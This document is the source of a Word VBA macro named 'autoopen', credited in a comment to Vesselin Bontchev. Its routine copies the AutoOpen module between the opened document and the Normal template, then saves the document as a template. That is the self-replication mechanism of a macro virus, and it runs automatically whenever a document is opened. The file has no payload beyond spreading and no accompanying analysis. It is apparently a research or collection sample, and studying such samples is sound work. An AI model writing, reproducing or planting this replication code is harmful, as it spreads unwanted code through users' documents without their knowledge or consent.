   Attribute VB_Name = "autoopen"
   '
   ' Vesselin Bontchev
   '
   Function CopyMac(src, Tgt) As Long
   On Error GoTo EndCopyMac
   Application.OrganizerCopy _
      Source:=src, _
      Destination:=Tgt, _
      Name:="AutoOpen", _
      Object:=wdOrganizerObjectProjectItems
   EndCopyMac:
   CopyMac = Err.Number
   On Error GoTo 0
   End Function
   Sub MAIN()
   doc$ = ActiveDocument.FullName
   gen$ = NormalTemplate.FullName
   ret = CopyMac(doc$, gen$)
   If (ret = 5940) Then
       ret = CopyMac(gen$, doc$)
     If (ret = 0) Then
        ActiveDocument.SaveAs _
           FileName:=doc$, _
           FileFormat:=wdFormatTemplate
     End If
   End If
   End Sub
